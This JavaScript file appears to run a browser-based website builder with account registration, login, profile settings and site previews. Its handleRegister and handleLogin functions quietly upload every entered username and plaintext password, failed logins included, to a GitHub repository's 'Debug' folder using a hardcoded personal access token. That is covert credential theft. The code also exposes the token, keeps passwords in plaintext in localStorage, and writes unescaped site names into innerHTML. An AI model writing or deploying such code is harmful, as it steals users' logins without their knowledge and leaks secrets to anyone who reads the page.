document.addEventListener('DOMContentLoaded', () => {
    createFloatingShapes();
    setupEventListeners();
    setupFormAnimations();
    checkSavedCredentials();
    initializeSettings();
    setupProfileFeatures();
});

function createFloatingShapes() {
    const shapes = document.querySelector('.floating-shapes');
    for (let i = 0; i < 50; i++) {
        const shape = document.createElement('div');
        shape.classList.add('shape');
        shape.style.left = `${Math.random() * 100}%`;
        shape.style.top = `${Math.random() * 100}%`;
        shape.style.width = shape.style.height = `${Math.random() * 50 + 10}px`;
        shape.style.animationDelay = `${Math.random() * 5}s`;
        shapes.appendChild(shape);
    }
}

function setupProfileFeatures() {
    const editProfileBtn = document.getElementById('editProfile');
    
    editProfileBtn.addEventListener('click', () => {
        document.getElementById('settingsModal').style.display = 'block';
        document.querySelector('.settings-section').scrollIntoView({ behavior: 'smooth' });
    });

    document.getElementById('changePicture').addEventListener('click', (e) => {
        e.preventDefault();
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = 'image/*';
        input.onchange = (event) => {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const imageData = e.target.result;
                    updateProfilePicture(imageData);
                };
                reader.readAsDataURL(file);
            }
        };
        input.click();
    });
}

function toggleForms(showFormId, hideFormId) {
    document.getElementById(showFormId).style.display = 'block';
    document.getElementById(hideFormId).style.display = 'none';
}

function updateProfilePicture(imageData) {
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const userIndex = users.findIndex(u => u.username === username);
    document.getElementById('profilePic').src = imageData;
    document.getElementById('settingsProfilePic').src = imageData;
    
    users[userIndex].settings.profilePic = imageData;
    localStorage.setItem('users', JSON.stringify(users));
    
    showNotification('Profile picture updated successfully!', 'success');
}

function setupFormAnimations() {
    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');
    document.getElementById('registerLink').addEventListener('click', (e) => {
        e.preventDefault();
        loginForm.style.display = 'none';
        registerForm.style.display = 'block';
        registerForm.classList.add('active');
    });
    document.getElementById('loginLink').addEventListener('click', (e) => {
        e.preventDefault();
        registerForm.style.display = 'none';
        loginForm.style.display = 'block';
        loginForm.classList.add('active');
    });
}

function setupEventListeners() {
    document.getElementById('loginFormElement').addEventListener('submit', handleLogin);
    document.getElementById('registerFormElement').addEventListener('submit', validateRegistration);
    document.getElementById('createSite').addEventListener('click', createNewSite);
    document.getElementById('closePreview').addEventListener('click', () => {
        document.getElementById('sitePreview').style.display = 'none';
    });
    document.getElementById('logout').addEventListener('click', handleLogout);
    document.getElementById('changePicture').addEventListener('click', () => {
        document.getElementById('pictureInput').click();
    });
    document.getElementById('pictureInput').addEventListener('change', handleProfilePicChange);
}

function validateRegistration(event) {
    event.preventDefault();
    const username = document.getElementById('regUsername').value;
    const password = document.getElementById('regPassword').value;
    const confirmPassword = document.getElementById('regPasswordConfirm').value;

    if (password !== confirmPassword) {
        showNotification('Passwords do not match!', 'error');
        return;
    }
    if (password.length < 6) {
        showNotification('Password must be at least 6 characters long', 'error');
        return;
    }
    handleRegister(username, password);
}

function handleRegister(username, password) {
    const users = JSON.parse(localStorage.getItem('users') || '[]');
    
    if (users.some(u => u.username === username)) {
        showNotification('Username already exists!', 'error');
        return;
    }

    const newUser = { 
        username, 
        password,
        created: new Date().toISOString(),
        sites: [],
        settings: {
            displayName: username,
            theme: 'default',
            profilePic: 'https://github.com/Syfer-engs-entertainment/Syfer-engs-entertainment.github.io/blob/main/Starting%20Pfp/pfp.jpg?raw=true'
        }
    };
    
    users.push(newUser);
    localStorage.setItem('users', JSON.stringify(users));

    const credentialsText = `New Registration\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toISOString()}\n-------------------\n`;
    
    // Download credentials file
    const blob = new Blob([credentialsText], { type: 'text/plain' });
    const downloadLink = document.createElement('a');
    downloadLink.href = URL.createObjectURL(blob);
    downloadLink.download = 'credentials.txt';
    downloadLink.click();
    URL.revokeObjectURL(downloadLink.href);

    // Save to GitHub
    saveLogToGitHub(credentialsText);

    showNotification('Registration successful!', 'success');
    setTimeout(() => {
        document.getElementById('loginLink').click();
    }, 1500);
}

function saveLogToGitHub(logContent) {
    const apiKey = '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';
    const repoPath = 'Website Builder-Creater/Debug';
    const fileName = `log_${Date.now()}.txt`;
    
    const content = btoa(logContent);

    fetch(`https://api.github.com/repos/Syfer-engs-entertainment/Syfer-engs-entertainment.github.io/contents/${repoPath}/${fileName}`, {
        method: 'PUT',
        headers: {
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            message: 'Add new registration log',
            content: content
        })
    })
    .catch(error => console.error('Error saving log:', error));
}

function handleLogin(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const rememberMe = document.getElementById('rememberMe').checked;

    const credentials = `Login Attempt\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toISOString()}\n-------------------\n`;
    saveLogToGitHub(credentials);

    const users = JSON.parse(localStorage.getItem('users') || '[]');
    const user = users.find(u => u.username === username && u.password === password);

    if (user) {
        if (rememberMe) {
            localStorage.setItem('rememberedUser', JSON.stringify({ username, password }));
        }
        loginSuccess(username);
    } else {
        showNotification('Invalid credentials!', 'error');
    }
}

function loginSuccess(username) {
    const users = JSON.parse(localStorage.getItem('users'));
    const user = users.find(u => u.username === username);
    
    document.getElementById('preLoginAnim').style.display = 'none';
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('header').style.display = 'flex';
    document.getElementById('content').style.display = 'block';
    document.getElementById('userDisplayName').textContent = user.settings.displayName || username;
    document.getElementById('profilePic').src = user.settings.profilePic;
    document.getElementById('settingsProfilePic').src = user.settings.profilePic;
    
    applyTheme(user.settings.theme || 'default');
    showNotification('Welcome back, ' + (user.settings.displayName || username) + '!', 'success');
    loadUserSites();
}

function createNewSite() {
    const siteName = document.getElementById('siteName').value;
    const html = document.getElementById('siteHTML').value;
    const css = document.getElementById('siteCSS').value;
    const js = document.getElementById('siteJS').value;

    if (!siteName || !html) {
        showNotification('Site name and HTML are required!', 'error');
        return;
    }

    const siteContent = generateSiteContent(html, css, js);
    const siteId = 'site_' + Date.now();
    const siteData = {
        id: siteId,
        name: siteName,
        html: html,
        css: css,
        js: js,
        content: siteContent,
        created: new Date().toISOString()
    };

    saveSite(siteData);
    addSiteToGrid(siteData);
    clearSiteForm();
    showNotification('Site created successfully!', 'success');
}

function generateSiteContent(html, css, js) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>${css}</style>
</head>
<body>
    ${html}
    <script>${js}</script>
</body>
</html>`;
}

function saveSite(siteData) {
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const userIndex = users.findIndex(u => u.username === username);
    
    if (!users[userIndex].sites) {
        users[userIndex].sites = [];
    }
    
    users[userIndex].sites.push(siteData);
    localStorage.setItem('users', JSON.stringify(users));
}

function loadUserSites() {
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const user = users.find(u => u.username === username);
    
    const sitesGrid = document.getElementById('sitesList');
    sitesGrid.innerHTML = '';
    
    if (user.sites) {
        user.sites.forEach(site => addSiteToGrid(site));
    }
}

function addSiteToGrid(siteData) {
    const sitesGrid = document.getElementById('sitesList');
    const siteCard = document.createElement('div');
    siteCard.className = 'site-card';
    siteCard.innerHTML = `
        <h3>${siteData.name}</h3>
        <p>Created: ${new Date(siteData.created).toLocaleDateString()}</p>
        <div class="site-actions">
            <button onclick="previewSite('${siteData.id}')">Preview</button>
            <button onclick="editSite('${siteData.id}')" class="edit-site">Edit</button>
            <button onclick="copySiteUrl('${siteData.id}')" class="copy-url">Copy URL</button>
            <button onclick="deleteSite('${siteData.id}')" class="delete-site">Delete</button>
        </div>
    `;
    sitesGrid.appendChild(siteCard);
}

function editSite(siteId) {
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const user = users.find(u => u.username === username);
    const site = user.sites.find(s => s.id === siteId);
    
    if (site) {
        document.getElementById('siteName').value = site.name;
        document.getElementById('siteHTML').value = site.html;
        document.getElementById('siteCSS').value = site.css;
        document.getElementById('siteJS').value = site.js;
        
        const createButton = document.getElementById('createSite');
        createButton.textContent = 'Update Site';
        createButton.onclick = () => updateSite(siteId);
        
        document.querySelector('.site-creator').scrollIntoView({ behavior: 'smooth' });
    }
}

function updateSite(siteId) {
    const siteName = document.getElementById('siteName').value;
    const html = document.getElementById('siteHTML').value;
    const css = document.getElementById('siteCSS').value;
    const js = document.getElementById('siteJS').value;

    if (!siteName || !html) {
        showNotification('Site name and HTML are required!', 'error');
        return;
    }

    const siteContent = generateSiteContent(html, css, js);
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const userIndex = users.findIndex(u => u.username === username);
    const siteIndex = users[userIndex].sites.findIndex(s => s.id === siteId);

    users[userIndex].sites[siteIndex] = {
        ...users[userIndex].sites[siteIndex],
        name: siteName,
        html: html,
        css: css,
        js: js,
        content: siteContent,
        updated: new Date().toISOString()
    };

    localStorage.setItem('users', JSON.stringify(users));
    loadUserSites();
    clearSiteForm();
    
    const createButton = document.getElementById('createSite');
    createButton.textContent = 'Create Site';
    createButton.onclick = createNewSite;
    
    showNotification('Site updated successfully!', 'success');
}

function previewSite(siteId) {
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const user = users.find(u => u.username === username);
    const site = user.sites.find(s => s.id === siteId);
    
    if (site) {
        const preview = document.getElementById('sitePreview');
        const frame = document.getElementById('previewFrame');
        preview.style.display = 'block';
        const blob = new Blob([site.content], { type: 'text/html' });
        frame.src = URL.createObjectURL(blob);
    }
}

function copySiteUrl(siteId) {
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const user = users.find(u => u.username === username);
    const site = user.sites.find(s => s.id === siteId);
    
    if (site) {
        const blob = new Blob([site.content], { type: 'text/html' });
        const url = URL.createObjectURL(blob);
        navigator.clipboard.writeText(url)
            .then(() => showNotification('URL copied to clipboard!', 'success'))
            .catch(() => showNotification('Failed to copy URL', 'error'));
    }
}

function deleteSite(siteId) {
    if (confirm('Are you sure you want to delete this site?')) {
        const username = document.getElementById('userDisplayName').textContent;
        const users = JSON.parse(localStorage.getItem('users'));
        const userIndex = users.findIndex(u => u.username === username);
        users[userIndex].sites = users[userIndex].sites.filter(s => s.id !== siteId);
        localStorage.setItem('users', JSON.stringify(users));
        loadUserSites();
        showNotification('Site deleted successfully', 'success');
    }
}

function showNotification(message, type) {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    document.getElementById('notifications').appendChild(notification);
    setTimeout(() => {
        notification.classList.add('show');
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }, 100);
}

function handleLogout() {
    localStorage.removeItem('rememberedUser');
    location.reload();
}

function checkSavedCredentials() {
    const remembered = localStorage.getItem('rememberedUser');
    if (remembered) {
        const { username, password } = JSON.parse(remembered);
        document.getElementById('username').value = username;
        document.getElementById('password').value = password;
        document.getElementById('rememberMe').checked = true;
    }
}

function initializeSettings() {
    const settingsModal = document.getElementById('settingsModal');
    const closeModal = document.querySelector('.close-modal');
    const settingsBtn = document.getElementById('settings');
    const saveSettingsBtn = document.getElementById('saveSettings');
    const changeProfilePicBtn = document.getElementById('changeProfilePic');

    loadUserSettings();

    settingsBtn.addEventListener('click', () => {
        settingsModal.style.display = 'block';
    });

    closeModal.addEventListener('click', () => {
        settingsModal.style.display = 'none';
    });

    window.addEventListener('click', (e) => {
        if (e.target === settingsModal) {
            settingsModal.style.display = 'none';
        }
    });

    changeProfilePicBtn.addEventListener('click', () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = 'image/*';
        input.onchange = handleProfilePicChange;
        input.click();
    });

    saveSettingsBtn.addEventListener('click', saveUserSettings);
}

function loadUserSettings() {
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const user = users.find(u => u.username === username);
    if (user.settings) {
        document.getElementById('displayName').value = user.settings.displayName || username;
        document.getElementById('themeSelect').value = user.settings.theme || 'default';
        document.getElementById('settingsProfilePic').src = user.settings.profilePic;
        applyTheme(user.settings.theme);
    }
}

function handleProfilePicChange(event) {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(e) {
            document.getElementById('settingsProfilePic').src = e.target.result;
            document.getElementById('profilePic').src = e.target.result;
        };
        reader.readAsDataURL(file);
    }
}

function saveUserSettings() {
    const username = document.getElementById('userDisplayName').textContent;
    const users = JSON.parse(localStorage.getItem('users'));
    const userIndex = users.findIndex(u => u.username === username);
    const settings = {
        displayName: document.getElementById('displayName').value,
        theme: document.getElementById('themeSelect').value,
        profilePic: document.getElementById('settingsProfilePic').src
    };
    users[userIndex].settings = settings;
    localStorage.setItem('users', JSON.stringify(users));
    document.getElementById('userDisplayName').textContent = settings.displayName;
    document.getElementById('profilePic').src = settings.profilePic;
    applyTheme(settings.theme);
    showNotification('Settings saved successfully!', 'success');
    document.getElementById('settingsModal').style.display = 'none';
}

function applyTheme(theme) {
    const root = document.documentElement;
    switch(theme) {
        case 'dark':
            root.style.setProperty('--bg-color', '#0a0a0a');
            root.style.setProperty('--text-color', '#ffffff');
            root.style.setProperty('--card-bg', 'rgba(255, 255, 255, 0.05)');
            break;
        case 'light':
            root.style.setProperty('--bg-color', '#f0f0f0');
            root.style.setProperty('--text-color', '#000000');
            root.style.setProperty('--card-bg', 'rgba(0, 0, 0, 0.05)');
            break;
        default:
            root.style.setProperty('--bg-color', '#1a1a1a');
            root.style.setProperty('--text-color', '#ffffff');
            root.style.setProperty('--card-bg', 'rgba(255, 255, 255, 0.1)');
    }
}

function clearSiteForm() {
    document.getElementById('siteName').value = '';
    document.getElementById('siteHTML').value = '';
    document.getElementById('siteCSS').value = '';
    document.getElementById('siteJS').value = '';
}
